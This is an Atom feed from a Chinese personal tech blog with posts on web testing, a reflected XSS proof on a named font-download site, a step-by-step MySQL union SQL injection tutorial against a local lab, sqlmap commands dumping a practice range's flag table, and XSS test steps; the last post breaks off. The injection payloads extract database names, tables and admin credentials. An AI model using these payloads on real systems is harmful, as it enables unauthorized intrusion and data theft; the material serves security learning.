    <updated>2021-04-14T11:05:35.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web测试要点"><a href="#Web测试要点" class="headerlink" title="Web测试要点"></a>Web测试要点</h2><ul><li><p>功能测试  -(最基本)</p><ul><li><p>链接测试</p><p>1.所有链接是否链接到该链接的页面</p><p>2.页面是否存在</p><p>3.不存在孤立页面</p></li><li><p>表单测试</p><p>1提交数据——&gt;注册(数据库 新增), 修改订单(数据库 改)</p><h5 id="常用控件-输入框-下拉框-上传文件-图片-Excel-txt等-提交按钮-单选多选"><a href="#常用控件-输入框-下拉框-上传文件-图片-Excel-txt等-提交按钮-单选多选" class="headerlink" title="常用控件:输入框,下拉框,上传文件(图片,Excel,txt等),提交按钮,单选多选"></a>常用控件:输入框,下拉框,上传文件(图片,Excel,txt等),提交按钮,单选多选</h5><ul><li>输入框:长度,数据类型,必填,重复   空格和业务约束</li><li>下拉框:默认信息,数据完整性/正确性,第一条最后一条</li><li>上传文件(图片,Excel,txt等):大小,格式,尺寸,数量等. 文件本身的内容规则验证</li><li>提交按钮:支持回车/单击;弱网测试 ,快速点击是否重复提交,提交内容是否涉及加密</li></ul></li><li><p>搜索测试</p><ul><li><p>输入框(按时间搜索),下拉框</p></li><li><p>假设:搜索条件A,B,C,D</p></li><li><p>任单个条件查询:下拉框,输入框(模糊搜索,超长搜索,不存在条件,为空)</p></li><li><p>时间搜索</p><p>开始时间,结束时间</p><p>开始时间=结束时间 ( 同一天数据)</p><p>开始时间&lt;结束时间(造跨年 跨天 跨月的数据)</p><p>开始时间&gt;结束时间(异常)</p><p>手动输入,格式</p></li></ul></li><li><p>删除测试</p><ul><li>没有数据,删除</li><li>选择一条数据/批量选择/全选,删除.   删除二次确认.且删除后合理提示</li><li>删除数据关联性</li><li>数据库角度,删,确认数据库是否及时更新</li></ul></li><li><p>cookie,session测试</p><ul><li>存储用户信息的,记录用户身份给予后续操作通行证</li><li>确认浏览器存储cookie目录有无cookie相关信息</li><li>保存时间之外,cookie是否正常</li><li>删除浏览器所有的cookie文件,再次登录,会怎么处理</li><li>鉴权</li></ul></li><li><p>数据库测试</p><ul><li>搭建测试环境,初始化sql脚本</li></ul></li></ul></li><li><p>界面/可用性测试</p><ul><li>是否跟产品原型/ui效果图一致</li><li>功能测试同步测试</li></ul></li><li><p>兼容性测试</p><ul><li>主要考虑浏览器</li><li>主流浏览器+内核(ie,firefox,Chrome,opera)</li><li>浏览器测试工具IEtest</li><li>功能测试同步关注</li></ul></li><li><p>接口测试</p><ul><li>确保后端代码的功能实现</li><li>jmeter</li></ul></li><li><p>安全测试</p><ul><li>sql注入，跨站攻击</li><li>漏洞扫描appscan </li></ul></li><li><p>性能测试</p><ul><li>jmeter/loadrunner</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web测试要点&quot;&gt;&lt;a href=&quot;#Web测试要点&quot; class=&quot;headerlink&quot; title=&quot;Web测试要点&quot;&gt;&lt;/a&gt;Web测试要点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;功能测试  -(最基本)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;链接测试&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Reflected XSS Vulnerability in Font Download Website</title>
    <link href="https://kayleh.top/Reflected-XSS-Vulnerability-in-Font-Download-Website/"/>
    <id>https://kayleh.top/Reflected-XSS-Vulnerability-in-Font-Download-Website/</id>
    <published>2021-04-10T10:26:29.000Z</published>
    <updated>2021-04-15T15:11:27.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字体下载网站的反射XSS漏洞"><a href="#字体下载网站的反射XSS漏洞" class="headerlink" title="字体下载网站的反射XSS漏洞"></a>字体下载网站的反射XSS漏洞</h2><blockquote><p>URL:<a href="http://www.ztxz.org" target="_blank" rel="noopener">http://www.ztxz.org</a></p></blockquote><p>搜索框输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>会出现弹窗，证明反射XSS的存在。</p><blockquote><p><a href="http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E" target="_blank" rel="noopener">http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E</a></p></blockquote><p>用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。例如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。它的利用过程如图所示。</p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Reflected-XSS-Vulnerability-in-Font-Download-Website/20190522105651307.png" alt="在这里插入图片描述"> </p><p>反射型XSS不会永久存储用户的数据，仅发生在用户的一次访问过程之后。这个过程就像一次反射，因此得名反射型XSS。反射型XSS的触发条件比较苛刻，需要攻击者想方设法引导用户点击链接，但产生的危害不容忽视。</p><p>参考资料：<a href="https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html</a></p><p> <a href="http://blog.csdn.net/binyao02123202/article/details/9041113" target="_blank" rel="noopener">http://blog.csdn.net/binyao02123202/article/details/9041113</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;字体下载网站的反射XSS漏洞&quot;&gt;&lt;a href=&quot;#字体下载网站的反射XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;字体下载网站的反射XSS漏洞&quot;&gt;&lt;/a&gt;字体下载网站的反射XSS漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;URL:&lt;a hr
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>SQL injection</title>
    <link href="https://kayleh.top/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://kayleh.top/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-05T17:48:59.000Z</published>
    <updated>2021-04-15T15:08:14.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><blockquote><p><a href="https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html</a></p></blockquote><h2 id="常见的几种SQL注入"><a href="#常见的几种SQL注入" class="headerlink" title="常见的几种SQL注入"></a>常见的几种SQL注入</h2><blockquote><p>1.数字型<br>2.字符型<br>3.文本型<br>4.搜索型(POST/GET)<br>5.cookie注入<br>6.SQL盲注<br>7.编码注入<br>8.宽字节注入</p></blockquote><h2 id="MySQL报错注入基本流程"><a href="#MySQL报错注入基本流程" class="headerlink" title="MySQL报错注入基本流程"></a>MySQL报错注入基本流程</h2><blockquote><p>1.判断sql注入<br>2.数据库权限判断<br>3.判断字段数<br>4.查询库名<br>5.查表名<br>6.查字段<br>7.查数据</p></blockquote><h3 id="1-数字型"><a href="#1-数字型" class="headerlink" title="1.数字型"></a>1.数字型</h3><p>1.判断sql注入</p><ul><li><p>提交单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2'</span><br></pre></td></tr></table></figure></li><li><p>and大法和or大法</p><p>在参数后面加上<code>and 1 = 1</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2 and 1 = 1     //可以查询</span><br><span class="line">http://localhost/sqls/index.php?id=2 and 1 = 2   //查询错误</span><br></pre></td></tr></table></figure><p> 可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。</p><p> 接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。 </p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=5 or 1 = 1</span><br></pre></td></tr></table></figure></li><li><p>加法和减法</p><p>加法和减法的使用要区别是数字型还是字符型的注入、然后来区分了、可以看他后面的参数如果是数字、就一定是数字型、如果是一些字母的话就是字符型注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id&#x3D;4  &#x2F;&#x2F;数字型注入 sql 语句</span><br><span class="line">select * from user where username&#x3D;’fendo’ &#x2F;&#x2F;字符型注入 sql 语句</span><br></pre></td></tr></table></figure><ul><li><p>加法</p><p> 我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，最后也就是%2b。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>+<span class="number">1</span> //第二条数据</span><br></pre></td></tr></table></figure></li><li><p>减法</p><p>减法是同样的道理，不过不需要对-号进行url编码了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">2</span><span class="number">-1</span> //第一条数据</span><br></pre></td></tr></table></figure></li></ul></li><li><p>数据库权限判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(user(),1,1))=114</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">判断ROOT权限 返回正确存在 </span><br><span class="line"><span class="comment">----------------------------------</span></span><br><span class="line">或 and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span></span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span>   <span class="comment">/* 如果结果返回正常,说明具有读写权限。</span></span><br><span class="line"><span class="comment">and (select count(*) from mysql.user)&gt;0   /* 返回错误，应该是管理员给数据库帐户降权了。</span></span><br></pre></td></tr></table></figure></li><li><p>判断字段数</p><p>常用的两种猜解方式:</p><ul><li><p>用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null…..</p><p>UNION SELECT 联合查询：可以用于一个或多个SELECT的结果集，但是他有一个条件，就是两个select查询语句的查询必须要有相同的列才可以执行，利用这个特性我们可以进行对比查询，也就是说当我们union select的列与它查询的列相同时，页面返回正常。在and后面加上1=1或1=2的作用后面会讲。</p></li></ul><p>例：</p><p>当字段为2时页面返回错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2 and 1 = 1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> //错误</span><br><span class="line"><span class="keyword">http</span>://localhost/sqls/index.php?<span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> //正常查询</span><br><span class="line"><span class="keyword">http</span>://localhost/sqls/index.php?<span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> //错误</span><br><span class="line"><span class="comment">-----</span></span><br><span class="line">说明字段数就是<span class="number">3</span>，输入的数大于或小于字段数时都会报错。使用 <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> 是一样的</span><br><span class="line"><span class="keyword">http</span>://localhost/sqls/index.php?<span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br></pre></td></tr></table></figure><ul><li><p>2.用order by 查询“order by * — order by</p><p>order by查询：在sql语句中是对结果集的指定列进行排序，比如我们想让结果集按照第一列排序就是 order by 1 按照第二列排序 order by 2 依次类推，按照这个原理我们来判断他的字段数，如果我们按照他的第1列进行排序数据库会返回正常，但是当我们按照第100列排序，但是数据库中并不存在第100列，从而报错。  同union</p></li></ul></li></ul><p><strong>这里有两个问题</strong></p><p><strong>第一个</strong>：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。<br>第一种：我们让第一个查询的结果始终为假</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2  and 1=2 union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br></pre></td></tr></table></figure><p><strong>第二种</strong>：通过limit语句，limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据</p><p>limit语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT [offset] rows | rows OFFSET offset</span><br></pre></td></tr></table></figure><p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。</p><p>列:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table LIMIT 5,10; &#x2F;&#x2F; 检索记录行 6-15</span><br></pre></td></tr></table></figure><p>在地址后面加入以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2  union select null,null,null limit 1,1</span><br></pre></td></tr></table></figure><p>  第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。 </p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/584a947239ae725aab3ee529f701eb7d.jpg" alt="img"> </p><ul><li>查询库名</li></ul><p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p><p>通过下面的语句可以判断数据库版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(version(),1,1))&gt;51</span><br></pre></td></tr></table></figure><p>解释1： 确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，当版本大于3.0时才能使用union方法；<br>解释2：ord()是mysql的函数用于获取二进制码；<br>解释3：mid()是mysql的函数用于截位操作；<br>解释4：version()是mysql的函数用于获取当前数据库的版本；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2  and ord(mid(version(),1,1))&gt;51</span><br></pre></td></tr></table></figure><p><strong>方法一:</strong></p><p>可以直接使用mysql自带函数database()查询得到数据库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select 1,database(),3 limit 1,1</span><br></pre></td></tr></table></figure><p><strong>方法二:</strong></p><p>使用以下语句语句得到所有的数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,schema_name,null from information_schema.schemata</span><br></pre></td></tr></table></figure><p>还可以获取第一个库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,1</span><br></pre></td></tr></table></figure><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/86d1024ab776770ef0a2f6e559ec83df.jpg" alt="img"> </p><p>并没有显示数据库名而显示的是第一条语句查询出来的结果。在union前面加上and 1=2，就能显示出来了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,1</span><br></pre></td></tr></table></figure><p>获取第二个库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,2</span><br></pre></td></tr></table></figure><ul><li>查表名</li></ul><p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。</p><p>方法一:</p><p>用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。</p><p>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;test&#39;</span><br></pre></td></tr></table></figure><p>方法二:</p><p>使用下面的语句也是可以查出来的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2 union <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'test'</span></span><br></pre></td></tr></table></figure><ul><li><p>查字段</p><p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。 </p><p>方法一:</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;sqltest&#39;</span><br></pre></td></tr></table></figure><p>  <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/055b34fa808266a8e9af8b9cea0865db.jpg" alt="img"> </p><p>也可以查看admin表中的字段。 </p><p>方法二:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2  union select null,column_name,null from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><ul><li><p>查数据</p><p>最终想得到的就是字段里的内容了、前面的数据库名、表名都获得了、获取值就很简单了。</p><p>方法一:</p><p>查询sqltest表:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2  union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">id</span>,title,<span class="keyword">content</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="string">`sqltest`</span></span><br></pre></td></tr></table></figure><p>查询admin表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(id,user,pwd),3 from admin</span><br></pre></td></tr></table></figure><p>方法二:</p><p>查询sqltest表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,title,content from sqltest</span><br></pre></td></tr></table></figure><p>查询admin表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select id,user,pwd from admin</span><br></pre></td></tr></table></figure><p>方法三:</p><p>查询admin表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,2,concat(user,0x3c,pwd) from admin</span><br></pre></td></tr></table></figure></li></ul><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><blockquote><p>工具：sqlmap</p><p>靶场：<a href="https://rimovni.exeye.run/hugkudure/well" target="_blank" rel="noopener">https://rimovni.exeye.run/hugkudure/well</a></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/1617673856077.png" alt="1617673856077" style="zoom:50%;"></p></blockquote><p>sqlmap注入常见用法：</p><div class="table-container"><table><thead><tr><th>检查注入点</th><th>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“</th></tr></thead><tbody><tr><td>列数据库信息</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ —dbs</td></tr><tr><td>指定数据库名列出所有表</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname —tables</td></tr><tr><td>指定数据库名表名列出所有字段</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname -T tablename —columns</td></tr><tr><td>定数据库名表名字段dump出指定字段</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname -T tablename -C columnname —dump</td></tr><tr><td>cookie 注入</td><td>—cookie=COOKIE 在需要登录的地方，需要登录后的cookie</td></tr><tr><td>执行指定的 SQL 语句</td><td>—sql-query=QUERY</td></tr><tr><td>代理注入</td><td>—proxy=”<a href="http://127.0.0.1:8087" target="_blank" rel="noopener">http://127.0.0.1:8087</a>“</td></tr></tbody></table></div><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "https://rimovni.exeye.run/hugkudure/well" --form --batch -D twosecu1_vuln_06 -T flag -C flag --dump</span><br></pre></td></tr></table></figure><blockquote><p>—form   :表单</p><p>—batch  :跳过选择</p></blockquote><p>开始注入，获得数据库</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/1617674097343.png" alt="1617674097343"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bugbank.cn/q/article/598
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Front end security</title>
    <link href="https://kayleh.top/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    <id>https://kayleh.top/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-04T07:56:49.000Z</published>
    <updated>2021-04-11T17:11:28.754Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前端安全</p></blockquote><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻击手段是在在利用网站上的可由用户输入信息的地方，恶意注入含有攻击性的脚本，达到攻击网站或者窃取用户cookied等隐私信息的目的。</p><blockquote><p>XSS漏洞测设流程：<br>第一步：在目标站点上找到输入点，比如查询接口，留言板等；<br>第二步：输入一组“特殊字符+唯一识别字符”，点击提交，查看返回的源码，是否有做对应的处理；<br>第三步：通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构成执行js的条件（构造闭合）<br>第四步：提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执则说明存在XSS漏洞</p></blockquote><h1 id="Html5存储"><a href="#Html5存储" class="headerlink" title="Html5存储"></a>Html5存储</h1><p><img src="https://static.cdnjs.cloud/20200628/%E6%89%B9%E6%B3%A8%202020-06-28%20113456_2412.png" alt="img"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前端安全&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;xss&quot;&gt;&lt;a href=&quot;#xss&quot; class=&quot;headerlink&quot; title=&quot;xss&quot;&gt;&lt;/a&gt;xss&lt;/h1&gt;&lt;p&gt;跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>What happened from entering the URL to displaying the page?</title>
    <link href="https://kayleh.top/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E7%BB%8F%E5%8E%86%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <id>https://kayleh.top/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E7%BB%8F%E5%8E%86%E4%BA%86%E4%BB%80%E4%B9%88/</id>
    <published>2021-03-30T09:22:51.000Z</published>
    <updated>2021-04-15T15:10:07.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从输入URL到显示页面经历了什么"><a href="#从输入URL到显示页面经历了什么" class="headerlink" title="从输入URL到显示页面经历了什么?"></a>从输入URL到显示页面经历了什么?</h1><blockquote><ul><li><p>这个过程可以大致分为两个部分：网络通信和页面渲染。</p><h3 id="一、网络通信"><a href="#一、网络通信" class="headerlink" title="一、网络通信"></a>一、网络通信</h3><p>  互联网内各网络设备间的通信都遵循TCP/IP协议，利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方进行通信。分层由高到低分别为：应用层、传输层、网络层、数据链路层。发送端从应用层往下走，接收端从数据链路层网上走。如图所示：</p><p><a href="http://images0.cnblogs.com/blog/622045/201507/020946547655321.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/从输入URL到显示页面经历了什么/020946553127518.png" alt="TCPIP"></a></p><h4 id="1-在浏览器中输入url"><a href="#1-在浏览器中输入url" class="headerlink" title="1. 在浏览器中输入url"></a>1. 在浏览器中输入url</h4><p>  用户输入url，例如<a 